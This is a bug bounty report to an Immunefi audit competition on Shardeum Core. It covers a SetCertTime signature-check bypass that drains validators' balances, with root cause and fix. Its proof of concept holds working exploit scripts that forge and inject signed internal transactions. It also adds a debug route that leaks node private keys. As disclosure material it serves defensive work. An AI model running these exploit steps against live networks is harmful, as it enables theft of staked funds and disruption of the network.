# #39812 \[BC-Critical] Bypass \`SetCertTime\` transaction signature check #1

**Submitted on Feb 8th 2025 at 00:38:00 UTC by @Blockian for** [**Audit Comp | Shardeum: Core III**](https://immunefi.com/audit-competition/audit-comp-shardeum-core-iii)

* **Report ID:** #39812
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/shardeum/shardeum/tree/bugbounty>
* **Impacts:**
  * Direct loss of funds
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Impact

Bypass the signature of `SetCertTime` transaction, which allows for draining any validators balance.

* Note: same impact as report [33750](https://reports.immunefi.com/shardeum-core/33750-bc-critical-abusing-setcerttime-transactions-to-drain-node-...) but a different root cause.

## Root Cause

There is an inconsistency between the function [`isSetCertTimeTx`](https://github.com/shardeum/shardeum//blob/bugbounty/src\tx\setCertTime.ts#L29-L29) and the function [isInternalTx](https://github.com/shardeum/shardeum//blob/bugbounty/src\tx\setCertTime.ts#L29-L29), specifically with regards to `.tx.isInternalTx`. This makes it so that `SetCertTime` transactions with `.tx.isInternalTx = true` don't undergo `SetCertTime` validation.

## Attack Flow

A malicious user submits a `SetCertTime` transaction on behalf of someone else (`nominator == victim`), causing a fee to be deducted from their account. The malicious user can then continue doing so until the node is kicked / drained.

## Deep Dive

When validating a `SetCertTime` transaction, the function [`validateTxnFields`](https://github.com/shardeum/shardeum//blob/bugbounty/src\setup\validateTxnFields.ts#L53-L53) which is used to validate transaction fields [calls](https://github.com/shardeum/shardeum//blob/bugbounty/src\setup\validateTxnFields.ts#L79-L79) [`isSetCertTimeTx`](https://github.com/shardeum/shardeum//blob/bugbounty/src\tx\setCertTime.ts#L29-L29) to decide if it should call [`validateSetCertTimeTx`](https://github.com/shardeum/shardeum//blob/bugbounty/src\tx\setCertTime.ts#L89-L89) which validates properties of the transaction, including [its signer's identity](https://github.com/shardeum/shardeum//blob/bugbounty/src\tx\setCertTime.ts#L108-L108) .

[`isSetCertTimeTx`](https://github.com/shardeum/shardeum//blob/bugbounty/src\tx\setCertTime.ts#L29-L29) returns `false` if `tx.isInternalTx` isn't set to `true`, even if `tx.internalTXType === InternalTXType.SetCertTime`:

```js
export function isSetCertTimeTx(tx): boolean {
  if (tx.isInternalTx && tx.internalTXType === InternalTXType.SetCertTime) {
    return true
  }
  return false
}
```

When applying a `SetCertTime` transaction, [the check is](https://github.com/shardeum/shardeum//blob/bugbounty/src\index.ts#L2902-L2902):

```js
internalTx.internalTXType === InternalTXType.SetCertTime
```

in order to call [`applySetCertTimeTx`](https://github.com/shardeum/shardeum//blob/bugbounty/src\tx\setCertTime.ts#L189-L189) even if `tx.isInternalTx` isn't set to `true`, as long as [isInternalTx](https://github.com/shardeum/shardeum//blob/bugbounty/src\tx\setCertTime.ts#L29-L29) returns `true`, which can happen if `tx.tx.isInternalTx` is `true`:

```js
export function isInternalTx(timestampedTx: any): boolean {
  if (timestampedTx && timestampedTx.raw) return false
  if (timestampedTx && timestampedTx.isInternalTx) return true
  if (timestampedTx && timestampedTx.tx && timestampedTx.tx.isInternalTx) return true // <-- HERE
  return false
}
```

The fee is then subtracted from the victim's balance in [`applySetCertTimeTx`](https://github.com/shardeum/shardeum//blob/bugbounty/src\tx\setCertTime.ts#L189-L189) [here](https://github.com/shardeum/shardeum//blob/bugbounty/src\tx\setCertTime.ts#L286-L286).

## Suggested Fix

I suggested to do 3 things:

1. Only use the `isInternalTx` function, never use `.isInternalTx`
2. Only use the `isSetCertTimeTx` function, never compare `internelTxType`
3. Remove the third check from `isInternalTx` as it is not used

## Severity

This allows to kick validators and do drain funds, and so it critical.\
In addition, this is the same as [33750](https://reports.immunefi.com/shardeum-core/33750-bc-critical-abusing-setcerttime-transactions-to-drain-node-...) which was classified as critical.

## Proof of Concept

## POC

1. All of `shardeum`, `core`, and `json-rpc-server` should be on the `bugbounty` branch
2. Apply `debug-10-nodes` as stated in the docs
3. Apply the following patch on core (the logs are optional):

```diff
diff --git a/src/logger/index.ts b/src/logger/index.ts
index bfabe928..2c4fae5a 100644
--- a/src/logger/index.ts
+++ b/src/logger/index.ts
@@ -148,7 +148,7 @@ export let logFlags: LogFlags = {
   net_rust: false,
   net_verbose: false,
   net_stats: false,
-  dapp_verbose: false,
+  dapp_verbose: true,
   profiling_verbose: false,
 
   aalg: false,
diff --git a/src/shardus/index.ts b/src/shardus/index.ts
index f29206b8..5003889a 100644
--- a/src/shardus/index.ts
+++ b/src/shardus/index.ts
@@ -2911,6 +2911,22 @@ class Shardus extends EventEmitter {
    * Register the exit and config routes
    */
   _registerRoutes() {
+    this.network.registerExternalGet('bugbounty', async (req, res) => {
+      const info = { 
+        active: Self.isActive,
+        ip: Self.ip,
+        port: Self.port 
+      }
+      if (Self.isActive) {
+        info['id'] = Self.id
+        info['public_key'] = Context.crypto.keypair.publicKey
+        info['private_key'] = Context.crypto.keypair.secretKey
+        info['active_nodes'] = NodeList.activeByIdOrder
+        info['archivers'] = [...Archivers.archivers.values()]
+        info['hash_key'] = config.crypto.hashKey
+      } 
+      res.send(info)
+    })
     // DEBUG routes
     this.network.registerExternalPost('exit', isDebugModeMiddlewareHigh, async (_req, res) => {
       res.json({ success: true })

```

4. Apply the following patch on `shardeum`

```diff
diff --git a/src/config/genesis.json b/src/config/genesis.json
index 53aeee7e..65e5cc1b 100644
--- a/src/config/genesis.json
+++ b/src/config/genesis.json
@@ -89,6 +89,9 @@
   "0x0c799D15c3f2e9dAf10677aD09565E93CAc3e4c4": {
     "wei": "1001000000000000000000"
   },
+  "0xE0291324263D7EC15fa3494bFDc1e902d8bd5d3d": {
+    "wei": "10000000000000000000000000"
+  },
   "0xEbe173a837Bc30BFEF6E13C9988a4771a4D83275": {
     "wei": "1001000000000000000000"
   },
```

5. Run the network with 10 nodes
6. Wait for all the nodes to be active
7. Run the following code, to create a staking account:

```js
import { ethers } from "ethers";
import { fromAscii } from "@ethereumjs/util";

// dont forget to add to src/config.genesis.json in shardeum, see server_genesis.patch
const VICTIM_WALLET = {
        address: "0xE0291324263D7EC15fa3494bFDc1e902d8bd5d3d",
        privateKey: "0x759418c4f40e463452b15eda4b27478d152f2a2c04e6cd324fb620a9eede6021"
}
const JSON_RPC_URL = "http://127.0.0.1:8080";

async function sendStakeTransaction() {
    const stake_to_address = "0x0000000000000000000000000000000000010000";
    const stake_data = {
        stake: 10000000000000000000,
        internalTXType: 6, // Stake
        nominee: VICTIM_WALLET.address.replace('0x', '').padEnd(64, '0'),
        nominator: VICTIM_WALLET.address,
    };
    const provider = new ethers.providers.JsonRpcProvider(JSON_RPC_URL);
    const wallet = new ethers.Wallet(VICTIM_WALLET.privateKey, provider);
    const stake_tx = {
        to: stake_to_address,
        value: BigInt(10000000000000000000),
        data: fromAscii(JSON.stringify(stake_data))
    };
    const tx = await wallet.sendTransaction(stake_tx);
    const receipt = await tx.wait();

    return receipt;
}
  
await sendStakeTransaction()
```

8. Run the following code, to start draining the staking account:

```js
import axios from "axios";
import crypto from '@shardus/crypto-utils';

crypto.init("69fa4195670576c0160d660c3be36556ff8d504725be8a59b5a96509e0c994bc")

const VICTIM_WALLET = {
    address: "0xE0291324263D7EC15fa3494bFDc1e902d8bd5d3d",
    privateKey: "0x759418c4f40e463452b15eda4b27478d152f2a2c04e6cd324fb620a9eede6021"
}
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms))

const main = async  () => {
    console.log("Grabbing Nodelist ....");
    let res = await axios.get('http://0.0.0.0:4000/nodelist')
    const nodelist = res.data.nodeList
    const randomNode = nodelist[Math.floor(Math.random() * nodelist.length)]

    const setCertTimeTx = {
        tx: {isInternalTx: true},
        internalTXType: 5,
        nominee: "",
        nominator: "",
        duration: 19, 
        timestamp: Date.now() + 1000,
    }

    setCertTimeTx.nominator = VICTIM_WALLET.address
    setCertTimeTx.nominee = VICTIM_WALLET.address.replace('0x', '').padEnd(64, '0');
    
    const nominator = setCertTimeTx.nominator.replace('0x', '').padEnd(64, '0')
    const before = await axios.get(`http://${randomNode.ip}:${randomNode.port}/account/${nominator}`)
    console.log("Balance and certExp before attack --------------------------------------")
    console.log(before.data);
    
    console.log("Constructing InternalTx setCertTime: ", setCertTimeTx)
    
    const url = `http://${randomNode.ip}:${randomNode.port}/bugbounty`
    res = await axios.get(url)
    if (!res.data.active) {
        console.log('ERROR - Attacker node is not active.')
        return
    }
    const CONFIG = res.data
    
    crypto.init(CONFIG['hash_key'])
    
    const ATTACKER_PUBLIC_KEY=CONFIG['public_key']
    const ATTACKER_PRIVATE_KEY=CONFIG['private_key']
    
    crypto.signObj(setCertTimeTx, ATTACKER_PRIVATE_KEY, ATTACKER_PUBLIC_KEY)
    console.log("Signing InternalTx setCertTime: ", setCertTimeTx)

    console.log("Firing InternalTx setCertTime ....")
    res = await axios.post(`http://${randomNode.ip}:${randomNode.port}/inject`, setCertTimeTx)

    if(!res.data.success) throw new Error(res.data.reason)
    console.log(`http://${randomNode.ip}:${randomNode.port}/inject`)
    console.log("Waiting 120 sec for transaction to be finalized");
    await sleep(120000)

    const after = await axios.get(`http://${randomNode.ip}:${randomNode.port}/account/${nominator}`)
    console.log("Balance and certExp after attack --------------------------------------")
    console.log(after.data);


}

main();
```

NOTE: This POC uses a node as the attacker just because it is guaranteed to have an account and I know its private key. Any account would do.
